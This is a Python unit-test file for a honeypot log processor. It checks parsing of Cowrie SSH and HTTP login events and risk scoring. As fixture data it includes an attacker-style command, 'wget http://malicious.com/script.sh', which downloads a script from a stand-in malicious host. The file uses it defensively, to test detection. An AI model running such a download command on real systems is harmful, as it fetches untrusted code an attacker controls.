# tests/test_log_parser.py
import unittest
import json
from datetime import datetime
from log_processor.log_parser import LogParser
from log_processor.data_enricher import DataEnricher

class TestLogParser(unittest.TestCase):
    def setUp(self):
        self.parser = LogParser()
        self.enricher = DataEnricher()
    
    def test_cowrie_login_success_parsing(self):
        """Test parsing Cowrie login success events"""
        log_line = json.dumps({
            "timestamp": "2024-01-01T10:00:00.000000Z",
            "eventid": "cowrie.login.success",
            "src_ip": "192.168.1.100",
            "session": "abc123",
            "protocol": "ssh",
            "username": "admin",
            "password": "password123"
        })
        
        result = self.parser.parse_cowrie_log(log_line)
        
        self.assertIsNotNone(result)
        self.assertEqual(result["event_type"], "cowrie.login.success")
        self.assertEqual(result["source_ip"], "192.168.1.100")
        self.assertEqual(result["credentials"]["username"], "admin")
        self.assertEqual(result["credentials"]["password"], "password123")
    
    def test_cowrie_command_parsing(self):
        """Test parsing Cowrie command input events"""
        log_line = json.dumps({
            "timestamp": "2024-01-01T10:01:00.000000Z",
            "eventid": "cowrie.command.input",
            "src_ip": "192.168.1.100",
            "session": "abc123",
            "input": "wget http://malicious.com/script.sh"
        })
        
        result = self.parser.parse_cowrie_log(log_line)
        
        self.assertIsNotNone(result)
        self.assertEqual(result["event_type"], "cowrie.command.input")
        self.assertEqual(result["commands"], "wget http://malicious.com/script.sh")
    
    def test_http_login_parsing(self):
        """Test parsing HTTP login attempts"""
        http_event = {
            "timestamp": "2024-01-01T10:00:00.000000Z",
            "ip": "192.168.1.200",
            "method": "POST",
            "url": "/login",
            "body": {"username": "admin", "password": "test123"},
            "userAgent": "Mozilla/5.0"
        }
        
        result = self.parser.parse_http_log(http_event)
        
        self.assertIsNotNone(result)
        self.assertEqual(result["event_type"], "http_post")
        self.assertEqual(result["source_ip"], "192.168.1.200")
        self.assertEqual(result["credentials"]["username"], "admin")
    
    def test_risk_scoring(self):
        """Test risk scoring functionality"""
        event = {
            "event_type": "cowrie.login.success",
            "source_ip": "192.168.1.100",
            "commands": "wget http://malicious.com/script.sh",
            "credentials": {"username": "admin"},
            "protocol": "ssh"
        }
        
        enriched_event = self.enricher.enrich_event(event)
        
        self.assertIn("risk_score", enriched_event)
        self.assertIn("risk_level", enriched_event)
        self.assertIn("enrichment", enriched_event)
        
        # High risk command should increase score
        self.assertGreater(enriched_event["risk_score"], 50)

if __name__ == "__main__":
    unittest.main()
